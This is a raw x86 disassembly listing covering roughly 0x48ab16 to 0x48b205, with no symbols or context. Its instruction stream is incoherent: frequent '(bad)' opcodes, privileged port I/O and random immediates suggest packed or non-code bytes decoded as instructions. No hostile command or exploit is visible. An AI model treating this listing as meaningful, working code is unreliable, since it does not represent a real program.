  48ab16:	cmp    BYTE PTR [ebx],dl
  48ab18:	icebp  
  48ab19:	push   esi
  48ab1a:	xchg   ecx,eax
  48ab1b:	das    
  48ab1c:	xchg   esi,eax
  48ab1d:	ss pop es
  48ab1f:	adc    DWORD PTR [eax+edx*8+0x14],ecx
  48ab23:	ss push edi
  48ab25:	xor    DWORD PTR [eax],ecx
  48ab27:	and    al,BYTE PTR es:[edi]
  48ab2a:	cmp    dh,BYTE PTR [eax+0x1]
  48ab2d:	pop    ss
  48ab2e:	pop    es
  48ab2f:	xor    eax,0x4d11c95f
  48ab34:	inc    esp
  48ab35:	pop    es
  48ab36:	inc    ecx
  48ab37:	icebp  
  48ab38:	inc    ebp
  48ab39:	lods   eax,DWORD PTR ds:[esi]
  48ab3a:	pop    eax
  48ab3b:	pop    es
  48ab3c:	repz add eax,0x71745a2
  48ab42:	daa    
  48ab43:	and    edx,DWORD PTR [eax]
  48ab45:	adc    esi,DWORD PTR [ecx-0x4ee8f859]
  48ab4b:	xchg   BYTE PTR ds:0xd50727e7,dh
  48ab51:	imul   ebp,DWORD PTR [ecx],0xa45c9f10
  48ab57:	mov    bh,0x86
  48ab59:	dec    edi
  48ab5a:	inc    edi
  48ab5b:	pop    ss
  48ab5c:	inc    ebx
  48ab5d:	mov    cl,BYTE PTR [ecx+0x7439338]
  48ab63:	xor    BYTE PTR [edi+0x5c],dl
  48ab66:	inc    esp
  48ab67:	pop    es
  48ab68:	xor    eax,0x48568ad0
  48ab6d:	aaa    
  48ab6e:	daa    
  48ab6f:	mov    BYTE PTR [ecx+0x44776098],cl
  48ab75:	pop    es
  48ab76:	push   esi
  48ab77:	add    al,0xd4
  48ab79:	sbb    eax,DWORD PTR [ebx+ebp*8-0x51]
  48ab7d:	xor    BYTE PTR [ebx],al
  48ab7f:	inc    edi
  48ab80:	xor    ah,bl
  48ab82:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  48ab83:	pop    ss
  48ab84:	mov    al,0x81
  48ab86:	pop    eax
  48ab87:	outs   dx,DWORD PTR ds:[esi]
  48ab88:	xchg   DWORD PTR [ebx-0x40ae9fdb],edi
  48ab8e:	dec    eax
  48ab8f:	and    eax,0x38870177
  48ab94:	or     ebx,eax
  48ab96:	add    al,0x2c
  48ab98:	pop    es
  48ab99:	xchg   DWORD PTR [edx+eax*1],edx
  48ab9c:	jns    0x48ab3e
  48ab9e:	xchg   DWORD PTR [eax+eax*1],esi
  48aba1:	inc    ebp
  48aba2:	lods   al,BYTE PTR ds:[esi]
  48aba3:	sbb    BYTE PTR [eax],al
  48aba5:	lods   al,BYTE PTR ds:[esi]
  48aba6:	ss scas eax,DWORD PTR es:[edi]
  48aba8:	ror    BYTE PTR [esi+0x43c720d5],0x8c
  48abaf:	stos   DWORD PTR es:[edi],eax
  48abb0:	adc    DWORD PTR [edx],edi
  48abb2:	dec    edi
  48abb3:	dec    edi
  48abb4:	inc    ebp
  48abb5:	bound  ebp,QWORD PTR [ebp+0x5617c4b8]
  48abbb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  48abbc:	pop    es
  48abbd:	xchg   edx,eax
  48abbe:	loope  0x48abc2
  48abc0:	scas   al,BYTE PTR es:[edi]
  48abc1:	xor    eax,DWORD PTR [edi+0x9182a43]
  48abc7:	fs inc esp
  48abc9:	pop    ds
  48abca:	in     eax,dx
  48abcb:	push   esi
  48abcc:	xor    esi,DWORD PTR [edi+eiz*2+0x26aaf72e]
  48abd3:	push   cs
  48abd4:	sbb    BYTE PTR [esi],ch
  48abd6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  48abd7:	push   ebp
  48abd8:	sbb    BYTE PTR [ebx-0x13],0x30
  48abdc:	push   edi
  48abdd:	push   ebx
  48abde:	mov    edi,0x5c920b01
  48abe3:	inc    esi
  48abe4:	pop    es
  48abe5:	push   eax
  48abe6:	adc    bl,BYTE PTR [edx+0x55]
  48abe9:	pop    edi
  48abea:	dec    edi
  48abeb:	push   ebp
  48abec:	shr    BYTE PTR [edx+0x48],0x7
  48abf0:	dec    edi
  48abf1:	lds    ebx,FWORD PTR [eax+0x5]
  48abf4:	adc    dh,bh
  48abf6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  48abf7:	xlat   BYTE PTR ds:[ebx]
  48abf8:	sub    BYTE PTR [edx],0x60
  48abfb:	pop    edi
  48abfc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  48abfd:	and    al,BYTE PTR [eax+0x15]
  48ac00:	xor    BYTE PTR [ebx],dh
  48ac02:	pop    edi
  48ac03:	add    DWORD PTR [ebx],eax
  48ac05:	repnz and eax,0xc04235b6
  48ac0b:	popf   
  48ac0c:	or     dl,BYTE PTR [eax+0x37]
  48ac0f:	ja     0x48ac53
  48ac11:	stos   DWORD PTR es:[edi],eax
  48ac12:	add    dl,BYTE PTR [edx]
  48ac14:	mov    edi,es
  48ac16:	pop    edi
  48ac17:	je     0x48ac1a
  48ac19:	mov    DWORD PTR [eax+0x3907742],edx
  48ac1f:	sub    ah,BYTE PTR [eax+0x37]
  48ac22:	xor    esi,DWORD PTR [eax-0x30dbf346]
  48ac28:	sub    BYTE PTR [eax+0x57671695],al
  48ac2e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  48ac2f:	sub    dh,BYTE PTR ds:0x34376fac
  48ac35:	mov    bl,BYTE PTR [ebp-0x60]
  48ac38:	scas   eax,DWORD PTR es:[edi]
  48ac39:	mov    dl,0xaf
  48ac3b:	add    al,0xf2
  48ac3d:	or     DWORD PTR [eax+0x57],ecx
  48ac40:	jg     0x48ac76
  48ac42:	dec    ebx
  48ac43:	lds    edx,FWORD PTR ds:0xaf171f84
  48ac49:	adc    eax,DWORD PTR [edi]
  48ac4b:	adc    BYTE PTR [ebp+0x57],0x45
  48ac4f:	xchg   ecx,eax
  48ac50:	dec    esp
  48ac51:	adc    BYTE PTR [edx],al
  48ac53:	out    0x39,eax
  48ac55:	dec    esp
  48ac56:	push   ss
  48ac57:	inc    edx
  48ac58:	xor    bh,BYTE PTR [ecx]
  48ac5a:	scas   eax,DWORD PTR es:[edi]
  48ac5b:	sub    al,0xac
  48ac5d:	or     bl,BYTE PTR [eax]
  48ac5f:	dec    edi
  48ac60:	mov    eax,ds:0xff45c6d0
  48ac65:	inc    edx
  48ac66:	xlat   BYTE PTR ds:[ebx]
  48ac67:	push   edx
  48ac68:	enter  0x155,0x2f
  48ac6c:	xor    ebx,ebp
  48ac6e:	pop    edx
  48ac6f:	test   BYTE PTR [eax-0x4fea4851],al
  48ac75:	mov    al,BYTE PTR [ecx+0x46c5679f]
  48ac7b:	arpl   WORD PTR [ecx-0x19],ax
  48ac7e:	pop    edi
  48ac7f:	lods   al,BYTE PTR ds:[esi]
  48ac80:	loopne 0x48acad
  48ac82:	adc    al,0x5f
  48ac84:	pop    es
  48ac85:	xor    eax,0x670555c9
  48ac8a:	inc    ebx
  48ac8b:	xor    al,0x19
  48ac8d:	inc    esi
  48ac8e:	test   BYTE PTR [ecx+0x3f],dl
  48ac91:	psubq  mm2,QWORD PTR [eax+0x72]
  48ac95:	push   ebp
  48ac96:	add    DWORD PTR [edi+0x37],esp
  48ac99:	xchg   esp,eax
  48ac9a:	ror    BYTE PTR [edx+0x17707a5],cl
  48aca0:	mov    ebp,DWORD PTR [eax+0x66373a1b]
  48aca6:	jl     0x48acfb
  48aca8:	push   ecx
  48aca9:	cmp    DWORD PTR [bx+0x36],ebx
  48acad:	fisttp WORD PTR [esi-0x387effaf]
  48acb3:	pop    ds
  48acb4:	pusha  
  48acb5:	add    eax,0x86679015
  48acba:	mov    ds:0x672f1602,al
  48acbf:	inc    ebx
  48acc0:	sbb    edx,DWORD PTR [ecx-0x7008dfa0]
  48acc6:	and    al,0x57
  48acc8:	push   esp
  48acc9:	add    DWORD PTR [edi+0x43],esp
  48accc:	jecxz  0x48acee
  48acce:	xor    al,0x52
  48acd0:	div    DWORD PTR [ebx]
  48acd2:	or     ah,BYTE PTR [eax-0x5c]
  48acd5:	cs mov edi,0xbe222a7f
  48acdb:	mov    cl,0x3
  48acdd:	(bad)  
  48acdf:	push   ebp
  48ace0:	adc    cl,0x77
  48ace3:	iret   
  48ace4:	inc    ebx
  48ace5:	sar    BYTE PTR [ebx],1
  48ace7:	adc    BYTE PTR [edx-0x71],0xb7
  48aceb:	pop    ebx
  48acec:	dec    ecx
  48aced:	mov    eax,ds:0xbfba0709
  48acf2:	push   ebx
  48acf3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  48acf4:	test   BYTE PTR [edi-0x75ba5886],al
  48acfa:	or     cl,BYTE PTR [eax]
  48acfc:	and    al,0xcf
  48acfe:	xor    al,0x10
  48ad00:	and    ebx,ebp
  48ad02:	out    0x5a,al
  48ad04:	inc    edi
  48ad05:	push   0xbf2d3090
  48ad0a:	xor    dl,BYTE PTR [edi+0x4018b931]
  48ad10:	dec    ebx
  48ad11:	inc    esp
  48ad12:	imul   ebp,DWORD PTR [eax-0x57],0x3647fb22
  48ad19:	inc    esi
  48ad1a:	enter  0x2977,0x63
  48ad1e:	inc    edi
  48ad1f:	or     esp,DWORD PTR ss:[ebx+edi*4+0x34476316]
  48ad27:	inc    edi
  48ad28:	mov    bh,0x26
  48ad2a:	adc    ebx,DWORD PTR [edi+0x89bab4e]
  48ad30:	shr    BYTE PTR [edx+0x4f],0xbf
  48ad34:	cmp    DWORD PTR [edi-0x1bf44265],edx
  48ad3a:	inc    ebp
  48ad3b:	cmp    DWORD PTR [edi],esi
  48ad3d:	pop    DWORD PTR [ebx+0x47]
  48ad40:	lds    ebp,FWORD PTR [edx]
  48ad42:	xchg   DWORD PTR ds:0x27275b03,eax
  48ad48:	push   ss
  48ad49:	pop    ebx
  48ad4a:	xlat   BYTE PTR ds:[ebx]
  48ad4b:	aas    
  48ad4c:	fcomip st,st(6)
  48ad4e:	je     0x48ad5b
  48ad50:	in     al,0xc1
  48ad52:	inc    edx
  48ad53:	daa    
  48ad54:	xor    DWORD PTR ss:[edx],0x17
  48ad58:	bound  ebx,QWORD PTR [eax+0x1e]
  48ad5b:	sbb    eax,DWORD PTR [edx+0x7]
  48ad5e:	sub    ecx,DWORD PTR [edx+0x61]
  48ad61:	cmp    DWORD PTR [esi+eax*2-0x7b9cf8ce],0x39bfb04c
  48ad6c:	mov    al,0x5a
  48ad6e:	and    bh,bl
  48ad70:	(bad)  
  48ad71:	inc    edi
  48ad72:	inc    ebx
  48ad73:	fistp  WORD PTR [ecx]
  48ad75:	pop    ss
  48ad76:	enter  0x2237,0x47
  48ad7a:	inc    ecx
  48ad7b:	inc    ebx
  48ad7c:	fst    st(4)
  48ad7e:	xchg   edx,eax
  48ad7f:	out    dx,eax
  48ad80:	das    
  48ad81:	inc    edi
  48ad82:	cmp    BYTE PTR [edi+0x18517d4c],bl
  48ad88:	jg     0x48adbf
  48ad8a:	test   BYTE PTR [ebx+ebx*8],al
  48ad8d:	stos   DWORD PTR es:[edi],eax
  48ad8e:	fild   QWORD PTR [ebx+0x5b]
  48ad91:	xor    BYTE PTR [eax+eax*8],ch
  48ad94:	sti    
  48ad95:	pop    es
  48ad96:	das    
  48ad97:	fwait
  48ad98:	cs nop
  48ad9a:	scas   eax,DWORD PTR es:[edi]
  48ad9b:	inc    ebp
  48ad9c:	inc    edi
  48ad9d:	xor    BYTE PTR ds:0x8d8252a3,dh
  48ada3:	adc    BYTE PTR [edi-0x45bf45b1],al
  48ada9:	lds    edi,FWORD PTR [edi-0x69]
  48adac:	inc    ecx
  48adad:	cmp    DWORD PTR [eax+0x4f7b3205],esp
  48adb3:	inc    edi
  48adb4:	cmp    BYTE PTR [eax+0x6c],bl
  48adb7:	shl    DWORD PTR [ecx+0x4847ef63],cl
  48adbd:	sub    DWORD PTR [ebp+0x62],0xf
  48adc1:	aaa    
  48adc2:	pop    ebx
  48adc3:	mov    edi,0x79dd2042
  48adc8:	pop    es
  48adc9:	inc    esp
  48adca:	loop   0x48adfd
  48adcc:	inc    edi
  48adcd:	xor    bl,al
  48adcf:	inc    esi
  48add0:	sbb    bl,BYTE PTR [eax-0x11]
  48add3:	xchg   edi,eax
  48add4:	ins    BYTE PTR es:[edi],dx
  48add5:	add    BYTE PTR [ebx],ah
  48add7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  48add8:	inc    ebp
  48add9:	adc    eax,0xcbd8c9ad
  48adde:	fild   WORD PTR [edi+0x6f83c846]
  48ade4:	add    DWORD PTR [edx+0x27],0x38
  48ade8:	loop   0x48ae42
  48adea:	dec    ebp
  48adeb:	cmp    cl,BYTE PTR [esi]
  48aded:	inc    esi
  48adee:	push   esi
  48adef:	xadd   BYTE PTR [edx-0x3d],ch
  48adf3:	xor    DWORD PTR [edi-0x46fdb8cc],ebx
  48adf9:	stos   BYTE PTR es:[edi],al
  48adfa:	sub    DWORD PTR [edi+0x38],eax
  48adfd:	aas    
  48adfe:	inc    ebx
  48adff:	out    dx,eax
  48ae00:	add    bh,BYTE PTR [ecx+0x45dfe2dd]
  48ae06:	ss inc esi
  48ae08:	cmp    ecx,edx
  48ae0a:	pop    ebx
  48ae0b:	and    BYTE PTR [edi],ah
  48ae0d:	inc    ebx
  48ae0e:	xchg   DWORD PTR [edi-0x58],edi
  48ae11:	and    eax,DWORD PTR [edx]
  48ae13:	sbb    al,0x42
  48ae15:	inc    edi
  48ae16:	inc    ecx
  48ae17:	sbb    dh,BYTE PTR [ecx-0x401ce1f5]
  48ae1d:	inc    ebx
  48ae1e:	xchg   edi,eax
  48ae1f:	adc    DWORD PTR [ebp+0x764f89b0],ebx
  48ae25:	aaa    
  48ae26:	sub    al,0xd8
  48ae28:	sub    cl,BYTE PTR [eax*2+0x640b477b]
  48ae2f:	ss outs dx,DWORD PTR es:[esi]
  48ae32:	fild   WORD PTR [ebp+0x8]
  48ae35:	jns    0x48ae27
  48ae37:	jb     0x48ae74
  48ae39:	and    ah,BYTE PTR [edi]
  48ae3b:	inc    ebx
  48ae3c:	nop
  48ae3d:	out    dx,al
  48ae3e:	xchg   ecx,eax
  48ae3f:	sar    bl,cl
  48ae41:	inc    edi
  48ae42:	inc    ecx
  48ae43:	lahf   
  48ae44:	jp     0x48ae16
  48ae46:	sub    eax,0xb67b9f1a
  48ae4b:	ret    0x88
  48ae4e:	inc    edi
  48ae4f:	add    cl,BYTE PTR [edi+0x6a]
  48ae52:	jne    0x48ae40
  48ae54:	les    eax,FWORD PTR [edi+0x7748160f]
  48ae5a:	or     eax,0x2c3247bf
  48ae5f:	nop
  48ae60:	fst    DWORD PTR [ebx]
  48ae62:	mov    edi,0xdd20308f
  48ae67:	or     ch,BYTE PTR [eax-0x11]
  48ae6a:	dec    edi
  48ae6b:	inc    ebx
  48ae6c:	inc    eax
  48ae6d:	dec    di
  48ae6f:	pop    eax
  48ae70:	repz xchg edi,eax
  48ae72:	inc    ecx
  48ae73:	nop
  48ae74:	out    dx,eax
  48ae75:	pop    ss
  48ae76:	mov    cl,0x4f
  48ae78:	inc    esp
  48ae79:	inc    edi
  48ae7a:	cmp    dl,bl
  48ae7c:	mov    ah,BYTE PTR [edi]
  48ae7e:	sub    al,0x87
  48ae80:	mov    edi,0x12ab8247
  48ae85:	shr    BYTE PTR [edi+0x38],0xbf
  48ae89:	cmp    BYTE PTR [eax+0x77453820],0x36
  48ae90:	ror    DWORD PTR [edx-0x50],cl
  48ae93:	je     0x48aef8
  48ae95:	inc    edi
  48ae96:	ror    BYTE PTR [eax],1
  48ae98:	imul   esi,DWORD PTR [eax+0x3645b77b],0x8790e022
  48aea2:	pop    edi
  48aea3:	xchg   edi,eax
  48aea4:	(bad)  
  48aea5:	aaa    
  48aea6:	push   es
  48aea7:	or     DWORD PTR [edx-0x41],esi
  48aeaa:	lock mov ch,0x60
  48aead:	js     0x48ae5e
  48aeaf:	out    0x9f,eax
  48aeb1:	xchg   ebp,eax
  48aeb2:	lds    ecx,FWORD PTR [eax]
  48aeb4:	jns    0x48af25
  48aeb6:	ss stos DWORD PTR es:[edi],eax
  48aeb8:	mov    cl,BYTE PTR [ebp-0x70768ff8]
  48aebe:	inc    edi
  48aebf:	add    eax,0x63cab158
  48aec4:	xlat   BYTE PTR ds:[ebx]
  48aec5:	push   ebx
  48aec6:	fild   WORD PTR [ecx-0x14a53084]
  48aecc:	fild   WORD PTR [ebp+0x72]
  48aecf:	shl    DWORD PTR [edi+0x68],1
  48aed2:	(bad)  [ecx]
  48aed4:	jg     0x48af1b
  48aed6:	push   esp
  48aed7:	and    BYTE PTR [ebx+0x5c476f05],0x30
  48aede:	ret    0x1662
  48aee1:	inc    esi
  48aee2:	mov    edi,0x6376d246
  48aee7:	and    DWORD PTR [edi-0x1f79cbba],0xb7ee058c
  48aef1:	xor    dl,BYTE PTR [ecx+0x63]
  48aef4:	ror    BYTE PTR [edx-0x31],1
  48aef7:	pusha  
  48aef8:	lea    edx,[eax+0x459673b6]
  48aefe:	adc    BYTE PTR [esi],0x48
  48af01:	pop    ebx
  48af02:	xchg   edi,eax
  48af03:	inc    esi
  48af04:	inc    ebx
  48af05:	pop    eax
  48af06:	mov    al,0x5d
  48af08:	xchg   edi,esp
  48af0a:	inc    DWORD PTR [edi+0x0]
  48af0d:	ja     0x48aeef
  48af0f:	sbb    esi,edi
  48af11:	mov    edi,0xd0d9b046
  48af16:	mov    BYTE PTR [edi+0xf],al
  48af19:	fistp  WORD PTR [ebx+0x30]
  48af1c:	dec    esp
  48af1d:	mov    edi,0x478b0730
  48af22:	xor    bh,BYTE PTR [ebx]
  48af24:	xchg   esi,eax
  48af25:	pop    eax
  48af26:	and    dh,cl
  48af28:	movhps QWORD PTR [edx],xmm0
  48af2b:	add    eax,0x3f471f78
  48af30:	add    eax,0x4f1b04c2
  48af35:	xor    DWORD PTR [ebx-0x437e9ec3],esi
  48af3b:	inc    esi
  48af3c:	inc    ecx
  48af3d:	and    ebp,DWORD PTR [edi]
  48af3f:	mov    WORD PTR [eax],cs
  48af41:	push   ss
  48af42:	jg     0x48af6b
  48af44:	outs   dx,BYTE PTR ds:[esi]
  48af45:	mov    WORD PTR [eax],cs
  48af47:	xor    BYTE PTR [edi+edi*4],dl
  48af4a:	xor    BYTE PTR [edi+0x70],al
  48af4d:	and    DWORD PTR [esi+0x31ffd368],edi
  48af53:	sbb    esp,0x36072886
  48af59:	inc    edi
  48af5a:	xor    BYTE PTR [ecx],ah
  48af5c:	sbb    eax,0x97276356
  48af61:	inc    ebp
  48af62:	xor    DWORD PTR [ecx+ebp*2+0x18],0x241970f
  48af6a:	stc    
  48af6b:	push   cs
  48af6c:	je     0x48afa7
  48af6e:	dec    ebx
  48af6f:	inc    edi
  48af70:	cmp    BYTE PTR [edx-0x6021fd93],al
  48af76:	retf   
  48af77:	inc    edi
  48af78:	pop    eax
  48af79:	repnz pop ebp
  48af7b:	loop   0x48afbf
  48af7d:	push   edi
  48af7e:	inc    edi
  48af7f:	xor    al,0xc0
  48af81:	es pop edx
  48af83:	sub    DWORD PTR [edi],eax
  48af85:	outs   dx,DWORD PTR ds:[esi]
  48af86:	xchg   ebp,eax
  48af87:	aam    0xb5
  48af89:	xchg   edi,ebp
  48af8b:	inc    esp
  48af8c:	xchg   DWORD PTR [eax],edi
  48af8e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  48af8f:	pusha  
  48af90:	cmp    esi,eax
  48af92:	or     dh,dl
  48af94:	mov    edi,0xd54b10df
  48af99:	mov    ecx,0xc7473f35
  48af9e:	(bad)  
  48af9f:	xchg   edx,eax
  48afa0:	scas   al,BYTE PTR es:[edi]
  48afa1:	ds inc esi
  48afa3:	lahf   
  48afa4:	push   ebp
  48afa5:	sub    DWORD PTR [ecx+0x1333ef0b],edi
  48afab:	mov    eax,DWORD PTR ds:0x476f8cdb
  48afb1:	mov    eax,DWORD PTR [ebx-0x68fb2275]
  48afb7:	inc    ecx
  48afb8:	inc    edi
  48afb9:	xor    dh,BYTE PTR [edi-0x5dd6fdc5]
  48afbf:	daa    
  48afc0:	(bad)  
  48afc1:	pop    edi
  48afc2:	pop    eax
  48afc3:	cwde   
  48afc4:	sbb    bl,BYTE PTR [eax-0x7d]
  48afc7:	aaa    
  48afc8:	dec    esp
  48afc9:	and    BYTE PTR [ebp+0x22777f14],dh
  48afcf:	rcr    BYTE PTR [ebx+ebp*1],0x23
  48afd3:	outs   dx,DWORD PTR ds:[esi]
  48afd4:	xor    al,0x5f
  48afd6:	and    BYTE PTR [ecx+0x2f1a3069],bh
  48afdc:	xor    al,0xdd
  48afde:	push   cs
  48afdf:	lods   al,BYTE PTR ds:[esi]
  48afe0:	rol    bh,0xef
  48afe3:	mov    dh,0x62
  48afe5:	mov    bh,0x5d
  48afe7:	push   eax
  48afe8:	mov    bh,0x31
  48afea:	sub    esi,DWORD PTR [edx+0x2e3990ef]
  48aff0:	xor    DWORD PTR [edi+0x7f],edi
  48aff3:	xor    al,0x55
  48aff5:	bound  esp,QWORD PTR [ebp+0x2c]
  48aff8:	inc    esi
  48aff9:	xchg   edi,eax
  48affa:	xor    BYTE PTR ds:0x3ffb1890,bl
  48b000:	rol    DWORD PTR [ebx-0x74ca37fa],0xcf
  48b007:	xchg   edi,eax
  48b008:	xor    BYTE PTR [esi],dl
  48b00a:	ins    BYTE PTR es:[edi],dx
  48b00b:	inc    edi
  48b00c:	and    esp,DWORD PTR [esi-0x53]
  48b00f:	sbb    BYTE PTR ds:0x227277f,0xf9
  48b016:	mov    ?,WORD PTR [eax]
  48b018:	inc    esp
  48b019:	repnz xchg edi,eax
  48b01b:	inc    ecx
  48b01c:	mov    dh,0xe9
  48b01e:	add    al,ah
  48b020:	pop    ds
  48b021:	aas    
  48b022:	fisttp WORD PTR [ebx-0x6f]
  48b025:	push   cs
  48b026:	and    edi,DWORD PTR [edx]
  48b028:	outs   dx,DWORD PTR ds:[esi]
  48b029:	inc    edi
  48b02a:	inc    eax
  48b02b:	mov    edx,0x678756da
  48b030:	leave  
  48b031:	bound  esi,QWORD PTR [ebp-0x282028eb]
  48b037:	ins    DWORD PTR es:[edi],dx
  48b038:	pusha  
  48b039:	shl    DWORD PTR [ecx-0x7d3f6871],0xcd
  48b040:	je     0x48b039
  48b042:	xchg   edi,eax
  48b043:	inc    ebp
  48b044:	fisttp WORD PTR [esi-0x2cada9d7]
  48b04a:	mov    edi,0x8d821f35
  48b04f:	inc    eax
  48b050:	cmp    edi,0xffffffdf
  48b053:	or     DWORD PTR [edi-0x2158abaf],esi
  48b059:	in     eax,dx
  48b05a:	xchg   esp,eax
  48b05b:	mov    al,ds:0xd25f76c6
  48b060:	(bad)  
  48b061:	fldenv [ebp+0x1736c816]
  48b067:	(bad)  
  48b068:	adc    BYTE PTR [ebx],ah
  48b06a:	push   es
  48b06b:	pushf  
  48b06c:	xor    BYTE PTR [edi-0x60],cl
  48b06f:	add    eax,0xdfcb1dd2
  48b074:	ss ja  0x48aff8
  48b077:	jl     0x48b018
  48b079:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  48b07a:	inc    ecx
  48b07b:	fild   WORD PTR [ecx+0x36]
  48b07e:	xchg   DWORD PTR [ecx+0x5a],esi
  48b081:	and    bh,bl
  48b083:	xor    eax,0x1e0e348f
  48b088:	inc    esi
  48b089:	in     al,dx
  48b08a:	push   esi
  48b08b:	pop    ss
  48b08c:	xchg   esi,eax
  48b08d:	(bad)  
  48b08f:	cmp    eax,0xdff902e3
  48b094:	inc    ebp
  48b095:	xor    ch,BYTE PTR [edi-0x7b]
  48b098:	mov    WORD PTR ds:0xff388ff2,es
  48b09e:	stos   DWORD PTR es:[edi],eax
  48b09f:	adc    dl,BYTE PTR [ebx+0x438f37ef]
  48b0a5:	xchg   edi,eax
  48b0a6:	arpl   WORD PTR [esp+ebx*1+0x8],bx
  48b0aa:	add    edi,DWORD PTR [edi+0x66]
  48b0ad:	loop   0x48b03a
  48b0af:	cmp    BYTE PTR [eax-0x21],ah
  48b0b2:	inc    edx
  48b0b3:	jae    0x48b0d0
  48b0b5:	lods   al,BYTE PTR ds:[esi]
  48b0b6:	adc    edx,esi
  48b0b8:	das    
  48b0b9:	inc    ebx
  48b0ba:	add    edi,0xffffffc0
  48b0bd:	add    ch,BYTE PTR [ecx-0x72]
  48b0c0:	xor    BYTE PTR [edi-0x10],bl
  48b0c3:	lods   al,BYTE PTR ds:[esi]
  48b0c4:	xor    eax,0xac1faf58
  48b0c9:	mov    eax,0xfabf1b06
  48b0ce:	out    0x5a,eax
  48b0d0:	mov    ds:0x1707459e,eax
  48b0d5:	inc    ecx
  48b0d6:	jo     0x48b089
  48b0d8:	mov    eax,ds:0x45df3487
  48b0dd:	inc    edi
  48b0de:	and    BYTE PTR ds:0x7317020,bl
  48b0e4:	add    al,0x5b
  48b0e6:	inc    esi
  48b0e7:	lods   eax,DWORD PTR ds:[esi]
  48b0e8:	pop    es
  48b0e9:	stos   DWORD PTR es:[edi],eax
  48b0ea:	xchg   edi,eax
  48b0eb:	pop    es
  48b0ec:	lds    esp,FWORD PTR [esi-0x48cce8be]
  48b0f2:	cmp    bh,bl
  48b0f4:	inc    edx
  48b0f5:	mov    BYTE PTR [edx],al
  48b0f7:	cmp    DWORD PTR [esi],0x7f
  48b0fa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  48b0fb:	xchg   BYTE PTR [ecx],dh
  48b0fd:	or     esi,edi
  48b0ff:	daa    
  48b100:	sbb    BYTE PTR [ebp+0x3fef2635],ah
  48b106:	xor    al,0xd6
  48b108:	loopne 0x48b08d
  48b10a:	xchg   esi,ebx
  48b10c:	dec    edx
  48b10d:	push   ds
  48b10e:	inc    ecx
  48b10f:	imul   esp,DWORD PTR [eax-0x5abce8a9],0x334068b1
  48b119:	xlat   BYTE PTR ds:[ebx]
  48b11a:	stos   DWORD PTR es:[edi],eax
  48b11b:	(bad)  
  48b11c:	inc    ecx
  48b11d:	inc    ebp
  48b11e:	popa   
  48b11f:	ja     0x48b155
  48b121:	add    DWORD PTR [edx+eax*4],ebp
  48b124:	and    edi,edi
  48b126:	ss aas 
  48b128:	add    eax,0xe7d82044
  48b12d:	pop    es
  48b12e:	test   DWORD PTR [edx],0x42c2caa9
  48b134:	xchg   DWORD PTR [ecx+0x6f],eax
  48b137:	ror    DWORD PTR [edx],0x1f
  48b13a:	dec    edi
  48b13b:	sti    
  48b13c:	add    BYTE PTR [ebx+eiz*2+0x14],bh
  48b140:	inc    edi
  48b141:	daa    
  48b142:	adc    DWORD PTR [esi+ecx*1-0x68],esi
  48b146:	pop    edi
  48b147:	xor    eax,DWORD PTR [edi+0x6b]
  48b14a:	sub    eax,DWORD PTR [esi]
  48b14c:	push   esi
  48b14d:	lahf   
  48b14e:	(bad)  
  48b14f:	mov    cl,0x14
  48b151:	call   0x85cc:0xf76f44a0
  48b158:	add    dl,BYTE PTR [esi]
  48b15a:	das    
  48b15b:	xor    esp,ebx
  48b15d:	adc    DWORD PTR [esi-0x4c28e01b],ecx
  48b163:	xchg   BYTE PTR [edx+0x6d],dh
  48b166:	sub    ch,BYTE PTR [ecx]
  48b168:	pop    ss
  48b169:	xor    BYTE PTR [edi+0x45],bl
  48b16c:	sub    dh,BYTE PTR [esi]
  48b16e:	jo     0x48b188
  48b170:	push   edx
  48b171:	test   DWORD PTR [edx],0xbfc1c3a0
  48b177:	(bad)  
  48b178:	outs   dx,DWORD PTR ds:[esi]
  48b179:	push   esi
  48b17a:	and    esp,DWORD PTR [ecx]
  48b17c:	pop    ss
  48b17d:	mul    DWORD PTR [edi+0x169d5606]
  48b183:	(bad)  
  48b184:	pop    esp
  48b185:	sbb    ebx,DWORD PTR [eax-0x3b]
  48b188:	iret   
  48b189:	into   
  48b18a:	aaa    
  48b18b:	fwait
  48b18c:	(bad)  
  48b18d:	mov    DWORD PTR [edi+ebx*4-0x6b1f4e55],eax
  48b194:	pop    ebx
  48b195:	pop    ss
  48b196:	ds pop ds
  48b198:	dec    eax
  48b199:	and    al,0x57
  48b19b:	daa    
  48b19c:	aas    
  48b19d:	xor    BYTE PTR [ebx-0x75a1583e],dl
  48b1a3:	jmp    edx
  48b1a5:	push   eax
  48b1a6:	cmp    ecx,DWORD PTR [esi-0x870be39]
  48b1ac:	xor    DWORD PTR [ecx-0x503896af],eax
  48b1b2:	or     dh,BYTE PTR [ecx+0x8]
  48b1b5:	inc    edi
  48b1b6:	cmp    edi,ecx
  48b1b8:	pop    ebp
  48b1b9:	sbb    dl,BYTE PTR [ecx+0x40]
  48b1bc:	mov    bh,0x27
  48b1be:	adc    ebp,ebx
  48b1c0:	add    al,0x74
  48b1c2:	xor    eax,0x2266b0c7
  48b1c7:	xor    al,0x7
  48b1c9:	outs   dx,DWORD PTR ds:[esi]
  48b1ca:	mov    al,ds:0x6f98c051
  48b1cf:	ja     0x48b176
  48b1d1:	cmp    BYTE PTR [eax],ch
  48b1d3:	fdiv   st(2),st
  48b1d5:	mov    esp,0x535226aa
  48b1db:	pop    edi
  48b1dc:	xor    DWORD PTR [ecx],0x447700b9
  48b1e2:	push   edi
  48b1e3:	cmp    al,0x94
  48b1e5:	mov    eax,0xc9b63f52
  48b1ea:	rol    BYTE PTR [esi+0x61],1
  48b1ed:	aas    
  48b1ee:	jg     0x48b225
  48b1f0:	mov    al,0xb5
  48b1f2:	test   al,0x84
  48b1f4:	aaa    
  48b1f5:	xor    dl,BYTE PTR [esi+0x8]
  48b1f8:	sub    al,0xbf
  48b1fa:	ja     0x48b204
  48b1fc:	and    DWORD PTR [edx-0x2cf86833],eax
  48b202:	pop    edx
  48b203:	mov    al,0xa
  48b205:	addr16 pop es
